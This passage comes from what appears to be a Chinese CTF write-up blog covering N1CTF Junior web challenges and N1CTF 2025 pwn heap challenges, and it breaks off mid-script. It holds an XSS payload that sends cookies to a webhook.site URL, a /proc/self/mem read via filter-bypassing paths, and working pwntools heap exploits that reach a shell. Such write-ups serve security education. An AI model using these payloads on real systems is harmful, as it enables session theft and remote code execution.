visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)    <span class="comment"># 访问 bio</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;&#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;...&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span>    <span class="comment">#  httpOnly不是httponly</span></span><br><span class="line">            &#125;])</span><br><span class="line">            ......</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)    <span class="comment"># 若访问的 url 页面中存在xss，则可以带出cookie</span></span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br></pre></td></tr></table></figure>

<p>思路如下：</p>
<p>注册用户名：<code>user.css</code></p>
<p>将payload写入 <code>bio</code>，<code>payload</code>如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">`https://webhook.site/b615b48c-adb7-4e53-97b6-ef4b71b4fa8f/<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 <code>/api/bio/user.css</code> ,生成缓存</p>
<p>然后在访问 &#x2F;view ，触发机器人读取 payload，并将cookie值带出</p>
<style>.muwifkxtpgsj{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914005025512.png" class="muwifkxtpgsj" alt="image-20250914005025512">

<h3 id="peekafork"><a href="#peekafork" class="headerlink" title="peekafork"></a>peekafork</h3><p>处理HTTP请求，并根据请求的文件名和offset读取文件内容</p>
<p>flag被写入某段内存中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">mm = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(flag))</span><br><span class="line">mm.write(flag)</span><br><span class="line">os.remove(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;proc&#x27;</span>, <span class="string">b&#x27;&lt;&#x27;</span>, <span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;^&#x27;</span>, <span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&#x27;&quot;&#x27;</span>, <span class="string">b&#x27;..&#x27;</span>, <span class="string">b&#x27;./&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(term <span class="keyword">in</span> initial_data.lower() <span class="keyword">for</span> term <span class="keyword">in</span> FORBIDDEN):</span><br><span class="line">        conn.sendall(<span class="string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">conn, addr, log, factor=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:   </span><br><span class="line">        request_data = conn.recv(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_data.startswith(<span class="string">b&quot;GET /&quot;</span>):</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]   <span class="comment"># 取出请求路径 </span></span><br><span class="line">            pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            length = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, path)    <span class="comment"># 匹配 ?offset=12&amp;length=123。仅匹配第一个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">                clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">                filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()  <span class="comment"># 去除首尾 &#x27;/&#x27;，得到filename</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.normpath(filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 读取 filename 文件内容</span></span><br><span class="line">                    <span class="keyword">if</span> offset &gt; <span class="number">0</span>:</span><br><span class="line">                        f.seek(offset)</span><br><span class="line">                    data_bytes = f.read(length)</span><br><span class="line">                    response_body = data_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                response_status = <span class="string">&quot;200 OK&quot;</span></span><br></pre></td></tr></table></figure>

<p>读取 &#x2F;proc&#x2F;self&#x2F;maps 查看flag存放的偏移 offset</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=0&amp;length=100000000000.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/maps</span><br></pre></td></tr></table></figure>

<p>得到maps：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 11653</span><br><span class="line"></span><br><span class="line">7fe58e045000-7fe58e047000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fe58f5c8000-7fe58f5c9000 rw-s 00000000 00:01 5143                       /dev/zero (deleted)</span><br><span class="line">7fe58f5c9000-7fe58f5cb000 rw-p 00000000 00:00 0 </span><br><span class="line">7fe58f5cb000-7fe58f5cc000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fe58f602000-7fe58f603000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffec822a000-7ffec824b000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffec83da000-7ffec83de000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffec83de000-7ffec83e0000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>根据本地python的对比测试，<code>mmap</code>后会有一个叫做 <code>/dev/zero (deleted)</code>的内存空间被分配出来<br>根据它的地址从<code>mem</code>中读取<code>mmap</code>到的flag</p>
<p>读取 <code>/proc/self/mem</code> 文件，<code>offset</code>设置为十进制的<code>0x7fe58f5c8000</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=140623929442304&amp;length=4096.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/mem</span><br></pre></td></tr></table></figure>

<p>拿到FLAG</p>
<p><img src="/image-20250914010944252.png" alt="image-20250914010944252"></p>
<h3 id="safenote"><a href="#safenote" class="headerlink" title="safenote"></a>safenote</h3><p>功能：</p>
<p>xss限制：nounce限制脚本执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/10/junior/" data-id="cuidFuavr-DITUWKXviTXOchY" data-title="n1ctf junior 2/2 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-n1ctf-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/16/n1ctf-pwn/" class="article-date">
  <time class="dt-published" datetime="2025-09-16T12:33:09.000Z" itemprop="datePublished">2025-09-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/16/n1ctf-pwn/">n1ctf2025_pwn</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h1><p>保护全开</p>
<h2 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h2><ol>
<li>读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor = <span class="number">0x111111111111111</span></span><br><span class="line">validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/4893f3cf5d0d480a8e32d9a11b2bbc82.png"></p>
<ol start="2">
<li><p>创建0x180的chunk存放note 结构体每个note大小为0x30，note结构：<br><img src="/290fdb0b196e4d8a891ba30cab77f70e.png"></p>
</li>
<li><p>add，edit，delete，show操作</p>
</li>
</ol>
<h2 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h2><ol>
<li><p>editName中strlen可以用\x00绕过造成溢出</p>
</li>
<li><p>后门：remove操作中有一个一眼就很可疑的地方：lucky number，<br><img src="/9b07c2893b9a413eab54aa77cdc96058.png" alt="在这里插入图片描述"><br>如果这里的if判断不通过，直接return，看反编译的伪代码不容易看出来，看汇编代码+动态调试可以发现<br>if判断的参数初始值为1，如果执行过一次editName操作以后，这个参数会自减一次，此时remove函数结束时会执行 ret lucyNumber操作<br><img src="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png" alt="[图片]"></p>
</li>
<li><p>这里的xor操作，其中的一个操作数是可控的，dest<br><img src="/efc5f43229f54d76933b5a234281a226.png"></p>
</li>
</ol>
<p><img src="/f46bbfaa51ec4ba798082ec1cc2ff78b.png"></p>
<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>editName操作和show操作只能执行一次<br>利用xor操作构造任意地址读写条件泄露libc地址</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一阶段：<br>泄露heap基址和程序基址（PIE）<br>由于存在xor后的数据chunk的地址，结合动态调试，heap地址的后三字节是固定的，加上一字节的\x00溢出，<br>第一个note content chunk的起始地址为000+0x290（tcache bin管理结构）+0x190(note 结构体 chunk)&#x3D;0x420<br>如果控制xor的操作数后两位为20，且第二个note content chunk与第一个同处于0x400-0x4ff空间上，当使用editName方法溢出第二个结构体chunk的name，此时这两个结构体chunk的note content chunk就指向了同一个，此时就构造了一个UAF，可以泄露heap地址和程序地址（程序地址用BSS的chunkList的地址）<br>此时edit和show都用过一次不能再用了，很自然的就想到再执行一次main函数，将luckynumber设置为main addr<br>第二阶段：<br>上面只是思考过程，此时才发现：<br>在回顾一下heap的构造，结构体chunk有一部分也处0x400-0x4ff，再溢出一次name则xor结果末两位是00，此时xor第一个操作数末两位是什么（假如设置为0xmn），那么这个溢出的结构体的conten就会指向0x4mn，第一阶段的泄露操作也可以通过最后一个结构体chunk泄露</p>
<p>这时就可以show和修改最后一个struct chunk的data  content chunk的地址（要写入xor后的结果），将其指向got表结合show操作就可以泄露libc、heap、程序地址<br>最后将LUCKYNUMBER设置为onegadget即可</p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    xor = <span class="number">0x111111111111111</span></span><br><span class="line">    validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    key_default = <span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span></span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    remove(key_default,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit_name(key_default,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>))</span><br><span class="line">    show(key_default,<span class="number">7</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    heap_base = ((uu64(r(<span class="number">7</span>))&lt;&lt;<span class="number">8</span>)^xor)&gt;&gt;<span class="number">12</span>&lt;&lt;<span class="number">12</span></span><br><span class="line">    leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    proc_base = uu64(ru(<span class="string">&#x27;\n&#x27;</span>)) - <span class="number">0x4080</span> - <span class="number">0x7</span>*<span class="number">8</span></span><br><span class="line">    leak(<span class="string">&#x27;proc_base&#x27;</span>,proc_base)</span><br><span class="line">    main_sym = <span class="number">0x1CC7</span></span><br><span class="line">    ret_addr_in_remove = proc_base+main_sym</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(ret_addr_in_remove))</span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    one_gadget = one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    edit_name(key_default,<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>)+p64((proc_base+elf.got[<span class="string">&#x27;free&#x27;</span>])^xor))</span><br><span class="line">    show(key_default,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    free_addr = uu64(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    libc.address = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(libc.address+one_gadget))</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h1 id="近队容器的礼仪"><a href="#近队容器的礼仪" class="headerlink" title="近队容器的礼仪"></a>近队容器的礼仪</h1><p>叽里咕噜的说什么呢，看不懂<br><img src="https://i-blog.csdnimg.cn/direct/3223b369f2604c2c9376f1811e20c019.png" alt="[图片]"></p>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>附件给出了pwn文件和libc文件夹，将libc.so.6和ld文件从libc文件夹中剪切出来，注意是剪切，确保libc文件夹中不再存在这两个文件，<br>直接运行使用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2 pwn</span><br><span class="line">patchelf --replace-needed libc.so.6  ./libc.so.6 pwn</span><br><span class="line">LD_LIBRARY_PATH=./libc pwn</span><br></pre></td></tr></table></figure>

<p>python中pwnlib调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也需要先像上面的shell命令一样先patchelf</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">p = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 二选一即可</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p = gdb.debug(binary, gdbscript,env=&#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;1. Exit\n&#x27;</span><br><span class="line">b&#x27;2. Add deque to vector\n&#x27;</span><br><span class="line">b&#x27;3. Create Animal in deque\n&#x27;</span><br><span class="line">b&#x27;4. Remove deque from vector\n&#x27;</span><br><span class="line">b&#x27;5. Remove Animal from deque\n&#x27;</span><br><span class="line">b&#x27;6. Edit Animal in deque\n&#x27;</span><br><span class="line">b&#x27;7. Print Animal in deque\n&#x27;</span><br><span class="line">b&#x27;12. Create Animal in vector\n&#x27;</span><br><span class="line">b&#x27;13. Remove Animal from vector\n&#x27;</span><br><span class="line">b&#x27;14. Edit Animal in vector\n&#x27;</span><br><span class="line">b&#x27;15. Print Animal in vector\n&#x27;</span><br><span class="line">b&#x27;Enter your choice: &#x27;</span><br></pre></td></tr></table></figure>

<p>IDA的结果看起来太复杂了，先直接进行几次操作看看<br><img src="https://i-blog.csdnimg.cn/direct/925bdfb6e35546b18e779289175c57c3.png" alt="[图片]"></p>
<p>先尝试下有没有UAF<br>结果一试还真有</p>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol>
<li>刚刚提到的UAF，可以通过unsorted bin fd泄露libc和tcache bin fd泄露heap基址</li>
<li>堆溢出<br><img src="/8a19c192b90d42a38510052ff390ade9.png"><br>很明显看到有个堆溢出</li>
</ol>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先利用deque上的操作泄露地址<br>后用vector上的操作任意地址写（当时熬夜写的题，我也没去分析它到底能不能用deque的方法来，就是觉得给了这么多方法都用试试）<br>vecor申请的chunk结构是：一个0x20大小的结构体和对应size大小的animal，结构体中写着animal chunk的地址，因为能栈溢出，所以直接可以任意地址写<br>这里采取的操作时打enviorn打栈，从main的ret指令开始打；<br>算出environ到执行到main ret时栈地址的偏移量，然后构造栈满足ongadget的条件即可，也可以构造rop链<br>利用脚本<br>最后执行exit操作就可以执行到main的ret<br>注意执行execve的时候保证结尾是0x0而不是8吧，对齐一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    add_deque()</span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    show_animal_deque(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&#x27;): &#x27;</span>)</span><br><span class="line">    libc.address = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))-<span class="number">0x203b20</span></span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>,libc.address)</span><br><span class="line">    <span class="comment"># 防止deque为空而不能show UAF</span></span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;    0xef52b execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x78])</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    address rbp-0x50 is writable</span></span><br><span class="line"><span class="string">    rax == NULL || &#123;&quot;/bin/sh&quot;, rax, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">    [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp&#x27;&#x27;&#x27;</span></span><br><span class="line">    one_gadget =libc.address + one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    environ =  libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)    </span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    environ_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x30</span>))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    